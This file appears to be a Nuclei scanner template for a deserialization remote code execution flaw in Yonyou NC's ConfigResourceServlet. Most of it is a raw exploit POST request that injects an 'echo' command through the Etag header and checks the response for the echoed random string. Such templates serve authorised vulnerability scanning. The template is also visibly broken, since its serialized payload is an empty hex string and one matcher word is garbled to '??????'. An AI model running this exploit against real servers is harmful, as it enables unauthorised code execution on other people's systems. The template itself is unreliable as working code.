id: yongyouNC-ConfigResourceServlet-rce

info:
  name: 用友NC ConfigResourceServlet接口存在反序列漏洞
  author: yongyouNC
  severity: critical
  tags: yongyouNC

http:
  - raw:
      - |
        POST /servlet/~ic/nc.bs.framework.server.ConfigResourceServlet HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Etag: echo {{randstr}}
        Connection: close

        {{hex_decode("")}}

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '{{randstr}}'
          - '??????'
        condition: and
    matchers-condition: and
